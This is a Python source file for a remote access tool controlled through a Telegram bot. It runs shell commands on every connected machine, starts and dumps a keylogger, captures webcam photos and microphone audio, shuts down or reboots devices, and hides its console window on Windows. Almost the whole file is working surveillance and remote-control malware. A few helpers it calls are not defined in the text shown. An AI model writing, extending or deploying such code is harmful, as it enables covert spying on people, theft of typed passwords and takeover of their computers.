#!/usr/bin/env python3
import os
import sys
import json
import time
import socket
import shutil
import psutil
import platform
import requests
import threading
import subprocess
from queue import Queue
from pynput import keyboard
from telegram import Bot, InputFile
from telegram.ext import CommandHandler, Updater, MessageHandler, Filters

# === CONFIG ===
CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'config.json')
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'keylogs.txt')
ACTIVE_DEVICES = {}  # {chat_id: device_info}
CURRENT_DEVICE = None  # Currently controlled device
keylogger = None  # Global keylogger instance

# === HELP MESSAGE ===
HELP_TEXT = """
🔧 *Available Commands:*

*Device Control:*
▸ /list - List all connected devices
▸ /select [number] - Connect to a device
▸ /exit - Disconnect from current device

*System Commands:*
▸ /shutdown - Power off the device
▸ /reboot - Restart the device
▸ [command] - Run any shell command

*Keylogging:*
▸ /keylog_start - Begin keylogging
▸ /keylog_stop - Stop keylogging
▸ /keylog_dump - Download keylogs

*Multimedia:*
▸ /webcam - Capture webcam photo
▸ /record - Record 5s of microphone audio

*Special Modes:*
▸ When no device selected, commands execute on ALL devices
▸ When device selected, commands only affect that device
"""

# === KEYLOGGER ===
class KeyLogger:
    def __init__(self):
        self.log = ""
        self.listener = None
        self.is_running = False

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            self.log += f" [{key}] "
        return True

    def start(self):
        if not self.is_running:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.is_running = True
            return "⌨️ Keylogger started"
        return "❌ Keylogger already running"

    def stop(self):
        if self.is_running:
            self.listener.stop()
            self.is_running = False
            with open(LOG_FILE, 'a') as f:
                f.write(self.log)
            self.log = ""
            return "⌨️ Keylogger stopped"
        return "❌ No active keylogger"

# === CORE FUNCTIONS ===
def broadcast_command(command_func, update, context, *args):
    """Execute command on all devices when none selected"""
    if CURRENT_DEVICE:
        command_func(update, context, *args)
    else:
        for device in ACTIVE_DEVICES.values():
            try:
                if 'bot' in device:
                    fake_update = type('', (), {'effective_chat': type('', (), {'id': device['chat_id']}), 
                                              'message': type('', (), {'reply_text': lambda x: device['bot'].send_message(device['chat_id'], x)})})()
                    command_func(fake_update, context, *args)
                    time.sleep(0.5)
            except Exception as e:
                print(f"Error broadcasting to {device['hostname']}: {str(e)}")

def execute_shell(command, device_name=""):
    """Execute shell command and return output"""
    try:
        result = subprocess.run(
            command, 
            shell=True, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            text=True
        )
        output = result.stdout if result.stdout else result.stderr
        prefix = f"💻 {device_name}:\n" if device_name else ""
        return f"{prefix}{output[:4000]}"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# === COMMAND HANDLERS ===
def handle_help(update, context):
    update.message.reply_text(HELP_TEXT, parse_mode='Markdown')

def handle_list(update, context):
    if not ACTIVE_DEVICES:
        update.message.reply_text("❌ No devices connected")
        return
    
    response = "📱 Connected Devices:\n"
    for i, (chat_id, device) in enumerate(ACTIVE_DEVICES.items(), 1):
        status = " (Selected)" if CURRENT_DEVICE and CURRENT_DEVICE['chat_id'] == chat_id else ""
        response += f"{i}. {device['hostname']} ({device['ip']}) - {device['user']}{status}\n"
    update.message.reply_text(response)

def handle_select(update, context):
    global CURRENT_DEVICE
    try:
        device_num = int(context.args[0]) - 1
        if 0 <= device_num < len(ACTIVE_DEVICES):
            CURRENT_DEVICE = list(ACTIVE_DEVICES.values())[device_num]
            update.message.reply_text(f"🔌 Connected to: {CURRENT_DEVICE['hostname']}")
        else:
            update.message.reply_text("❌ Invalid device number")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /select <device_number>")

def handle_exit(update, context):
    global CURRENT_DEVICE
    if CURRENT_DEVICE:
        update.message.reply_text(f"🚪 Disconnected from: {CURRENT_DEVICE['hostname']}")
        CURRENT_DEVICE = None
    else:
        update.message.reply_text("❌ No active device")

def handle_shell(update, context):
    command = update.message.text
    if command.startswith('/'):
        return
    
    if CURRENT_DEVICE:
        output = execute_shell(command, CURRENT_DEVICE['hostname'])
        update.message.reply_text(output)
    else:
        for device in ACTIVE_DEVICES.values():
            output = execute_shell(command, device['hostname'])
            update.message.reply_text(output)
            time.sleep(0.3)

def handle_shutdown(update, context):
    def shutdown():
        if platform.system() == "Windows":
            os.system("shutdown /s /t 1")
        else:
            os.system("shutdown -h now")
    
    broadcast_command(
        lambda u, c: u.message.reply_text("⚠️ Shutting down...") or shutdown(),
        update, context
    )

def handle_reboot(update, context):
    def reboot():
        if platform.system() == "Windows":
            os.system("shutdown /r /t 1")
        else:
            os.system("reboot")
    
    broadcast_command(
        lambda u, c: u.message.reply_text("⚠️ Rebooting...") or reboot(),
        update, context
    )

def handle_keylog_start(update, context):
    global keylogger
    if not keylogger:
        keylogger = KeyLogger()
    broadcast_command(
        lambda u, c: u.message.reply_text(keylogger.start()),
        update, context
    )

def handle_keylog_stop(update, context):
    if keylogger:
        broadcast_command(
            lambda u, c: u.message.reply_text(keylogger.stop()),
            update, context
        )
    else:
        update.message.reply_text("❌ No active keylogger")

def handle_keylog_dump(update, context):
    if os.path.exists(LOG_FILE):
        update.message.reply_document(InputFile(LOG_FILE))
    else:
        update.message.reply_text("❌ No logs available")

def handle_webcam(update, context):
    def capture_and_send(u):
        if capture_webcam():
            u.message.reply_document(InputFile('webcam.jpg'))
        else:
            u.message.reply_text("❌ Webcam capture failed")
    
    broadcast_command(capture_and_send, update, context)

def handle_record(update, context):
    def record_and_send(u):
        if record_microphone():
            u.message.reply_document(InputFile('recording.wav'))
        else:
            u.message.reply_text("❌ Audio recording failed")
    
    broadcast_command(record_and_send, update, context)

# === MAIN ===
def main():
    config = get_config()
    global keylogger
    keylogger = KeyLogger()

    updater = Updater(token=config['bot_token'], use_context=True)
    dispatcher = updater.dispatcher

    # Register handlers
    handlers = [
        CommandHandler('help', handle_help),
        CommandHandler('list', handle_list),
        CommandHandler('select', handle_select),
        CommandHandler('exit', handle_exit),
        CommandHandler('shutdown', handle_shutdown),
        CommandHandler('reboot', handle_reboot),
        CommandHandler('keylog_start', handle_keylog_start),
        CommandHandler('keylog_stop', handle_keylog_stop),
        CommandHandler('keylog_dump', handle_keylog_dump),
        CommandHandler('webcam', handle_webcam),
        CommandHandler('record', handle_record),
        MessageHandler(Filters.text & ~Filters.command, handle_shell)
    ]
    
    for handler in handlers:
        dispatcher.add_handler(handler)

    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    if platform.system() == 'Windows':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    main()
